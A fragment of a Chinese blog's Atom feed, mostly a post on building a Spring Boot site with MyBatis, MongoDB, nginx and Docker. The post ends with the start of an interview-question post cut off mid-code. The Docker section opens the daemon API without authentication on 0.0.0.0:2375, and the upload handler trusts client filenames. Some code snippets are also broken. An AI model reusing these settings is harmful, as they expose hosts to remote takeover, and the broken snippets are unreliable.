      <category term="安全渗透" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F/"/>
    
      <category term="C++" scheme="http://yoursite.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Java web开发及安全设计</title>
    <link href="http://yoursite.com/2019/10/19/java%20web%E5%BC%80%E5%8F%91%E5%8F%8A%E5%AE%89%E5%85%A8%E8%AE%BE%E8%AE%A1/"/>
    <id>http://yoursite.com/2019/10/19/java web开发及安全设计/</id>
    <published>2019-10-19T02:33:23.268Z</published>
    <updated>2019-11-03T05:22:59.396Z</updated>
    
    <content type="html"><![CDATA[<p>项目地址为：<a href="https://github.com/flowerlake/spring-blog-website" target="_blank" rel="noopener">https://github.com/flowerlake/spring-blog-website</a></p><ol><li>spring系列框架的理解</li><li>与前端交互的方式</li><li>后台如何接受并处理请求</li><li>spring boot的一些基本概念及项目框架的搭建</li><li>对orm框架：mybatis+mysql的理解及应用</li><li>如何在spring boot项目中集成nosql。例MongoDB</li><li>文件流的处理</li><li>使用docker部署项目</li><li>web设计安全及编码规范</li><li>具体编码过程中的一些细节</li><li>总结</li></ol><h3 id="spring-mvc框架及一些基本概念"><a href="#spring-mvc框架及一些基本概念" class="headerlink" title="spring mvc框架及一些基本概念"></a>spring mvc框架及一些基本概念</h3><p>Spring作为Java系的全栈(full-stack)开发框架，当然也对Web开发有着非常好的支持。Spring的Web MVC框架能够使开发者非常容易的开发Web应用，同时能够无缝享受到Spring本身的诸多好处——IoC容器、AOP编程等等。它对HTTP请求处理的模型如下图（图来自天码营）：<br><img src="http://assets.tianmaying.com/md-image/dbd1017dffce1d08e653d05baa1e4934.png" alt="Spring MVC请求处理流程"><br>上图中，web服务器接收到的请求会经过DispatcherServlet的分发，经过一系列的 interceptor 进行预处理，在这里数据的预处理顺序与interceptor的顺序有关，<br>之后，将请求交给controller进行处理，返回请求（response）时同样会经过一系列的 interceptor 进行后处理，这就是 interceptor 的预处理和后处理功能。<br>更多关于interceptor的内容查看 #interceptor。</p><p><strong>基本概念</strong></p><ul><li><p><strong>ORM（object relation mapping），顾名思义是 对象关系映射。</strong><br>ORM是一种以面向对象的方式来进行数据库操作的技术。Web开发中常用的语言，都会有对应的ORM框架。而MyBatis就是Java开发中一种常用ORM框架。<br>ORM框架：hibernate和mybatis；spring data jpa是 Spring Data的子模块 hibernate 作为ORM实现。<br>面向对象致力于解决计算机逻辑问题，而关系模型致力于解决数据的高效存取问题。</p></li><li><p><strong>IoC（Inversion of Control，控制反转）</strong><br>使用Spring的@Component标注将QunarBookingService注册进Spring的Context，这样它就可以被注入到需要它的地方！相应地，创建QunarBookingService实例的责任也交给了Spring。</p></li><li><p><strong>AOP（Aspect Oriented Programming，AOP）</strong><br>面向切面编程（Aspect Oriented Programming，AOP）其实就是一种关注点分离的技术，在软件工程领域一度是非常火的研究领域。<br>我们软件开发时经常提一个词叫做“业务逻辑”或者“业务功能”，我们的代码主要就是实现某种特定的业务逻辑。但是我们往往不能专注于业务逻辑，<br>比如我们写业务逻辑代码的同时，还要写事务管理、缓存、日志等等通用化的功能，而且每个业务功能都要和这些业务功能混在一起，痛苦！<br>所以，为了将业务功能的关注点和通用化功能的关注点分离开来，就出现了AOP技术。这些通用化功能的代码实现，对应的就是我们说的切面（Aspect）。</p></li></ul><h3 id="与前端交互的方式"><a href="#与前端交互的方式" class="headerlink" title="与前端交互的方式"></a>与前端交互的方式</h3><p>前端与后端的交互，本质上只有4种交互方式，即GET、POST、PUT、DELETE，一般来说仅涉及到GET、POST两种方式，剩下的就是前端的渲染。<br>对于前端渲染也有2种方式：一种是通过模板引擎对网页进行渲染，这种方式本质上是在服务端对网页进行渲染，即向事先写好的HTML模板中填充内容，然后将填充完的内容返回到前端页面；另一种方式就是通过ajax的方式进行数据请求，彻底将前后端分开，这种方式的处理方式是浏览器接收后台返回的原始HTML页面，在接收到页面请求的一瞬间就执行ajax部分的代码，ajax发出GET请求，得到数据，使用JavaScript（当然现在更方便的是使用jQuery）来对前端页面进行渲染。这两种方式各有优劣，但是在大公司里面前后端分工很细的情况下，大概率都会选择第2种方式进行设计。</p><p>基本的交互方式就不说了，网上有很多理解HTTP的文章，主要说一下前端渲染的方式：</p><p>1、模板引擎<br>在Java的开发web开发中，有很多模板引擎，比如大名鼎鼎的thymeleaf，模板之间没有什么特殊的差别，目前还没有碰到thymeleaf不能解决的渲染情况。<br>使用thymeleaf进行HTML的渲染，好处就是代码比较简单、开发比较便捷，缺点就是不符合前后端完全分离的思想，页面在服务端渲染加重了服务器的计算负担。</p><p>2、使用ajax进行请求渲染<br>这个需要在前端页面不少前端页面渲染的代码。</p><p><strong>注意：</strong>视频网站是怎样的处理方式，暂时还没有研究。</p><h3 id="后台如何接受并处理请求"><a href="#后台如何接受并处理请求" class="headerlink" title="后台如何接受并处理请求"></a>后台如何接受并处理请求</h3><p>首先服务器接收到tcp连接（HTTP）后，与服务器建立连接，服务器收到HTTP请求，将其转化为对应的端口如80端口，nginx监听80端口，将80端口的数据转发到对应的处理服务，即后台服务程序spring-blog-website的8080端口。该应用程序（spring boot）集成了Tomcat动态数据服务器，8080端口 收到nginx转发过来的请求后，实际上是转发给Tomcat服务器，然后Tomcat把请求转发给后台服务程序，后台服务程序根据controller处理对应的请求。</p><p>后台接收到请求后，都是在围绕着一件事在做——即对数据的处理。</p><p>对数据的处理虽然听上去很简单，但是这里面又涉及到很多附带的点，比如数据的校验、加密、基本处理等，然后就涉及到数据的增删改查以及数据的持久化，整个后台如何处理数据是核心。即网站设计时要考虑的很多方面也都是围绕着数据进行的，如数据结构的设计、什么类型的数据选择对应的数据库解决方案，比如本文中使用较多的文本类型的数据，那就可以选择MongoDB作为后台数据库。</p><p>后台应用程序干完上述的事情之后，就可以把从数据库中得到的数据进行一番操作之后返回给浏览器，浏览器接收到响应之后对数据页面进行渲染。</p><p><strong>nginx的配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://spring-blog-website:8080;</span><br><span class="line">        proxy_set_header Host $host:$server_port;</span><br><span class="line">        proxy_set_header X-Forwarded-Host $server_name;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        </span><br><span class="line">        client_max_body_size 100M;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /static &#123;</span><br><span class="line">        access_log   off;</span><br><span class="line">        expires      30d;</span><br><span class="line"></span><br><span class="line">        alias /spring-blog-website/static;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="spring-boot的一些基本概念及项目框架的搭建"><a href="#spring-boot的一些基本概念及项目框架的搭建" class="headerlink" title="spring boot的一些基本概念及项目框架的搭建"></a>spring boot的一些基本概念及项目框架的搭建</h3><p>新建一个项目的时候，第一要熟悉这个框架的结构，才能更好的梳理出整个项目的大致框架，等到建好这个项目的大框架之后，就可以丰富内部空间了。第一次接触spring的框架难免有些懵逼，不懂这个框架的结构是什么样的，现在来简单了解一下。在spring的官网首页上，有这么一张图 Spring Framework 5：<br><img src="https://spring.io/img/homepage/diagram-boot-reactor.svg" alt><br>在上图中，我们可以看到spring框架现在构建基石是spring boot2.0，然后在网站下有spring boot2.0的一些官方文档： </p><ul><li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/" target="_blank" rel="noopener">Spring Boot Reference Manual</a></li><li><a href="https://spring.io/guides/gs/spring-boot/" target="_blank" rel="noopener">Getting Started Guide</a></li></ul><p>如果要新建一个spring boot的项目，主要有两种方式：</p><ul><li>一种是在本地IDEA中选择新建spring initialize项目，选择default，然后选择需要的组件</li><li>一种是通过spring提供的<a href="https://start.spring.io/" target="_blank" rel="noopener">https://start.spring.io/</a> 网站初始化项目所需要的组件。</li></ul><p><img src="https://tva1.sinaimg.cn/large/006y8mN6gy1g8jxu7qxhaj31on0u0gs2.jpg" alt></p><p>新建完项目之后，得到一个基本的spring boot项目框架，项目文件夹resource下有一个application.properties(当然，可以有多个properties文件，通过在application.peoperties中定义使用其中某个配置文件，这一点可以用于本地开发和部署环境存在些许差异时方便的进行切换。)</p><p>除此之外，还需要进一步搭建web应用程序的框架。一般来说，在web项目中，通常要包括几个方面，controller层、service层、model层、dao层。</p><ul><li>controller层写class，写具体的流程控制，接收service层获得的数据，然后传递给前端页面。</li><li>service层写interface，写一些业务逻辑，不同于 mapper，mapper主要是写数据库操作的逻辑代码，service 主要写针对业务的一些从数据库的代码接口。</li><li>model层写Bean，设计每一块业务对应的数据项，并提供一些方法。</li><li>dao层写mybatis对应的一些mapper，即操作数据对象与sql语句进行对应，当然，也可以写nosql。</li></ul><p>最后，这个项目的基本框架就搭起来了，接下来就是向里面填东西了。本文设计的Java web不涉及传统的jsp开发，前端界面的渲染是通过ajax和模板引擎(thymeleaf)共同完成的。网上有很多文章还都是旧的技术，从jsp这些说起，感觉太落伍了，就琢磨出了这套开发模式。但是也要记住spring mvc也是在servelet基础上封装的，熟悉一下servelet的技术还是没有坏处的，但是jsp就不推荐了。</p><h3 id="对orm框架：mybatis-mysql的理解及应用"><a href="#对orm框架：mybatis-mysql的理解及应用" class="headerlink" title="对orm框架：mybatis+mysql的理解及应用"></a>对orm框架：mybatis+mysql的理解及应用</h3><p><strong>ORM（object relation mapping），顾名思义是 对象关系映射。</strong><br>ORM是一种以面向对象的方式来进行数据库操作的技术。Web开发中常用的语言，都会有对应的ORM框架。而MyBatis就是Java开发中一种常用ORM框架。现在开发中主流的ORM框架有hibernate和mybatis，而Spring data jpa是 Spring Data的子模块 hibernate 作为ORM实现。</p><p><strong>面向对象致力于解决计算机逻辑问题，而关系模型致力于解决数据的高效存取问题。</strong></p><p>MyBatis 是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架，几乎避免了所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或标注，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录。简单地理解，你可以认为MyBatis将SQL语句，以及SQL返回结果到Java对象的映射，都放到了一个易于配置的XML文件里了，你的Java代码就会变得异常简单。在xml文件中，通过定义mapper对象，可以把Mybatis的查询语句映射到SQL语句上。</p><p>当然，除了XML，MyBatis同时也支持基于标注的方式，但是功能上会有一些限制。总体来说，我们推荐使用XML方式，一些简单的SQL使用标注会更方便一些。</p><p>在spring boot项目中，整合Mybatis主要有以下两种方式：</p><ul><li><p>Mybatis提供的第一种映射方法：使用mapper进行映射。mapper接口，用来定义数据库的查询、增加、删除等操作;</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"org.flowerlake.blogwebsite.dao.UserMapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insert"</span> <span class="attr">parameterType</span>=<span class="string">"org.flowerlake.blogwebsite.model.User"</span>&gt;</span></span><br><span class="line">        INSERT INTO `t_user`(`username`, `password`) VALUES (#&#123;username&#125;, #&#123;password&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Mybatis提供的第二种映射方法，直接在数据库操作类中使用@插入注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@(<span class="string">"SELECT * FROM t_user WHERE username = #&#123;username&#125;"</span>)</span><br><span class="line"><span class="function">List&lt;User&gt; <span class="title">findByUsername</span><span class="params">(@Param(<span class="string">"username"</span>)</span> String username)</span>;</span><br></pre></td></tr></table></figure></li></ul><p>以上两种方法都需要在接口类上加上@Mapper注解。</p><p><strong>使用spring-boot提供的application.properties文件将mybatis整合到spring-boot项目中</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/java_web?useUnicode=true&amp;characterEncoding=UTF-8&amp;zeroDateTimeBehavior=convertToNull&amp;allowMultiQueries=true&amp;useSSL=false</span><br><span class="line">spring.datasource.username=username</span><br><span class="line">spring.datasource.password=password</span><br><span class="line"></span><br><span class="line">#这种方式需要自己在resources目录下创建mapper目录然后存放xml</span><br><span class="line">mybatis.mapper-locations=classpath:mapper/*.xml</span><br><span class="line">mybatis.type-aliases-package=org.flowerlake.blogwebsite.model</span><br></pre></td></tr></table></figure><p><strong>使用orm框架能否有效控制SQL注入漏洞的产生呢？首先，我们要看一下mybatis的源码：</strong></p><h3 id="如何在spring-boot项目中集成nosql"><a href="#如何在spring-boot项目中集成nosql" class="headerlink" title="如何在spring boot项目中集成nosql"></a>如何在spring boot项目中集成nosql</h3><p>本文以MongoDB为例讲解spring boot继承nosql。MongoDB的和jpa有点类似，都是通过名称注解。在spring boot项目中集成MongoDB数据库，只需要以下几个步骤：</p><ol><li><p>在application.properties中添加MongoDB的连接信息，当然在实际项目中，要添加数据库用户信息(用户名+密码等)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.data.mongodb.uri=mongodb://localhost:27017/java_web</span><br></pre></td></tr></table></figure></li><li><p>定义数据结构，即model类，在类前加上@Document注解。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Document</span>(collection = <span class="string">"articles"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Article</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> ObjectId _id;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>定义一个增删改查的接口，提供增删改查方法的定义，该接口需要继承自MongoRepository。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ArticleRepository</span> <span class="keyword">extends</span> <span class="title">MongoRepository</span>&lt;<span class="title">Article</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">List&lt;Article&gt; <span class="title">findByAuthor</span><span class="params">(String author)</span></span>;</span><br><span class="line">    <span class="function">Article <span class="title">findByEnTitle</span><span class="params">(String enTitle)</span></span>;</span><br><span class="line">    <span class="function">Article <span class="title">findByTitle</span><span class="params">(String title)</span></span>;</span><br><span class="line">    <span class="function">Page&lt;Article&gt; <span class="title">findAll</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>写具体的服务逻辑，在service中新建service接口，然后实现它、当然直接写具体的服务类也是没有问题的，面对业务需求灵活改变即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArticleServiceImpl</span> <span class="keyword">implements</span> <span class="title">ArticleService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> MongoTemplate mongoTemplate;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ArticleRepository articleRepository;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Article&gt; <span class="title">findByAuthor</span><span class="params">(String author)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> articleRepository.findByAuthor(author);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">updateArticle</span><span class="params">(Article article)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Query query = <span class="keyword">new</span> Query(<span class="keyword">new</span> Criteria(<span class="string">"id"</span>).is(article.getEnTitle()));</span><br><span class="line">            Update update = <span class="keyword">new</span> Update();</span><br><span class="line">            update.set(<span class="string">"author"</span>, article.getAuthor());</span><br><span class="line">            update.set(<span class="string">"enTitle"</span>, article.getEnTitle());</span><br><span class="line">            mongoTemplate.updateMulti(query, update, Article.class);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.info(<span class="string">"update article error: "</span> + e.toString());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>在Controller类中使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(value = <span class="string">"/news/&#123;enTitle&#125;"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">displaySingleNews</span><span class="params">(@PathVariable(<span class="string">"enTitle"</span>)</span> String enTitle, Model model, HttpSession session) </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ArticleService articleService;</span><br><span class="line">        Article findArticle = articleService.findByEnTitle(enTitle);</span><br><span class="line">        model.addAttribute(<span class="string">"news"</span>, findArticle);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"news/singleArticle"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><p>注意在代码中使用了@Resource注解，要理解@Resource和@Autowired的区别：</p><ul><li>@Resource默认是按照名称来装配注入的，只有当找不到与名称匹配的bean才会按照类型来装配注入；</li><li>@Autowired默认是按照类型装配注入的，如果想按照名称来转配注入，则需要结合@Qualifier一起使用</li></ul><h3 id="文件流的处理"><a href="#文件流的处理" class="headerlink" title="文件流的处理"></a>文件流的处理</h3><p>文件流的处理涉及到前端上传的方式和后台的处理方式，后台一般通过MultipartFile类型来处理文件流，这里使用Files的copy操作，查看copy的源码，其实它也是通过读写stream二进制流完成文件的写操作的。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">store</span><span class="params">(MultipartFile file)</span> </span>&#123;</span><br><span class="line">        String filename = StringUtils.cleanPath(file.getOriginalFilename());</span><br><span class="line">        <span class="keyword">try</span> (InputStream inputStream = file.getInputStream()) &#123;</span><br><span class="line">        Files.copy(inputStream, <span class="keyword">this</span>.rootLocation.resolve(filename),</span><br><span class="line">        StandardCopyOption.REPLACE_EXISTING);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.rootLocation.resolve(filename).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>Files.copy中调用的私有copy方法源码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> <span class="title">copy</span><span class="params">(InputStream source, OutputStream sink)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        <span class="keyword">long</span> nread = <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[BUFFER_SIZE];</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = source.read(buf)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sink.write(buf, <span class="number">0</span>, n);</span><br><span class="line">            nread += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nread;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>读文件的操作也是一样的，这里再关注一下程序是怎么接收文件的请求的。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"people/uploadNews"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> returnNewsStatus <span class="title">handleNewsUpload</span><span class="params">(MultipartHttpServletRequest httpServletRequest, HttpSession session)</span> </span>&#123;</span><br><span class="line">        String uploadFilePath = <span class="string">""</span>;</span><br><span class="line">        List&lt;MultipartFile&gt; fileList = httpServletRequest.getFiles(<span class="string">"file"</span>);</span><br><span class="line">        String title = httpServletRequest.getParameter(<span class="string">"newsTitle"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在上述代码中，我们使用MultipartHttpServletRequest类来接收请求的数据，这是为了处理包含了文件二进制流数据和正常文本数据的混合型请求（比如在发表文章时需要附带附件），而MultipartHttpServletRequest继承了HttpServletRequest, MultipartRequest类，这两个类可以分别处理二进制流数据和文本数据。</p><p>有时候有大文件上传的需求，只在application.properties中可以设置处理HTTP请求的大小限制，如下是把文件上传的限制改为50m大小。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring.servlet.multipart.max-file-size=50MB</span><br><span class="line">spring.servlet.multipart.max-request-size=50MB</span><br></pre></td></tr></table></figure></p><p>踩坑经历：<br>之前文件下载是将其安排在resources的static目录下，这一安排的目的是使其作为静态资源，直接通过浏览器请求即可下载（如同对静态资源css、js这样的文件的处理），这种安排在开发环境是没有问题的，这是因为：静态资源只在项目启动的第一次进行加载，后续就不会实时加载改变的静态资源，但是在开发环境下，我们可以采用某些浏览器插件实现静态资源的实时更新。（参考 <a href="https://juejin.im/post/5d4cc6ac518825052c07e587" target="_blank" rel="noopener">https://juejin.im/post/5d4cc6ac518825052c07e587</a> ），但是在生产环境就不能这么做了，因为用户是不会主动安装浏览器插件的，因此这种方案要pass掉，就要采用处理正常get请求一样处理文件下载的请求数据，该模块在GetFileHandle下实现。</p><h4 id="使用docker部署项目"><a href="#使用docker部署项目" class="headerlink" title="使用docker部署项目"></a>使用docker部署项目</h4><p>将项目通过docker-compose部署后的一个小技巧：</p><p>一旦将服务器主机和docker容器的目录映射之后，两者的文件内容是同步的，如果要修改项目文件内容，其实只要修改主机上的即可，volume会直接同步到容器。使用IDEA的docker plugin使得这一方式更加方便。这样的话即使要修改代码，只需要将代码使用scp命令同步一下即可。</p><p>记录Ubuntu开启docker 远程访问API</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /lib/systemd/system/docker.service；</span><br><span class="line">// 找到ExecStart，</span><br><span class="line">ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H </span><br><span class="line">unix:///var/run/docker.sock；</span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>有一个想法：在本地开发完之后，能否直接把spring boot项目、mysql数据库、MongoDB打包在一个容器里，这样对于小型项目的部署会更加方便，而且可以使一套系统随意分发。</p><h4 id="web设计安全及编码规范"><a href="#web设计安全及编码规范" class="headerlink" title="web设计安全及编码规范"></a>web设计安全及编码规范</h4><h4 id="具体编码过程中的一些细节"><a href="#具体编码过程中的一些细节" class="headerlink" title="具体编码过程中的一些细节"></a>具体编码过程中的一些细节</h4><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>当然，这些设计的内容，web开发的网站较为简单，内容交互和处理的方式还是比较简单，比如对于视频类的网站，该怎么处理，这里面涉及到二进制流数据的传输，视频传输一般都是建立在UDP的协议基础之上。还有对于淘宝这样的网站，后台的要求必然是非常之高的，主要是如何处理这么大的并发量，要考虑的细节问题之多超乎想象。<br>计算机领域有句话叫做：没有什么问题是一个中间件不能解决的，如果有，那就俩。因此面对各种需求问题，中间件的设计又处于一个非常重要的地位，比如阿里云举办的中间件大赛给中间件的设计提供了一个交流平台。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;项目地址为：&lt;a href=&quot;https://github.com/flowerlake/spring-blog-website&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/flowerlake/spring-blo
      
    
    </summary>
    
    
      <category term="-Java" scheme="http://yoursite.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>大厂面试题目</title>
    <link href="http://yoursite.com/2019/09/01/%E5%A4%A7%E5%8E%82%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2019/09/01/大厂面试题目/</id>
    <published>2019-09-01T03:23:31.870Z</published>
    <updated>2019-11-03T05:24:39.224Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-1-1-如何实现一个高效的单向链表逆序输出？"><a href="#1-1-1-如何实现一个高效的单向链表逆序输出？" class="headerlink" title="1.1.1 如何实现一个高效的单向链表逆序输出？"></a>1.1.1 如何实现一个高效的单向链表逆序输出？</h4><p>出题人：阿里巴巴出题专家：昀龙／阿里云弹性人工智能负责人</p><h5 id="参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。"><a href="#参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。" class="headerlink" title="参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。"></a>参考答案：下面是其中一种写法，也可以有不同的写法，比如递归等。供参考。</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span>           data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>*  <span class="title">next</span>;</span></span><br><span class="line">    node(<span class="keyword">int</span> d):data(d), next(<span class="literal">NULL</span>)&#123;&#125;</span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(node* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">NULL</span> == head || <span class="literal">NULL</span> == head-&gt;next)&#123;</span><br><span class="line">        <span 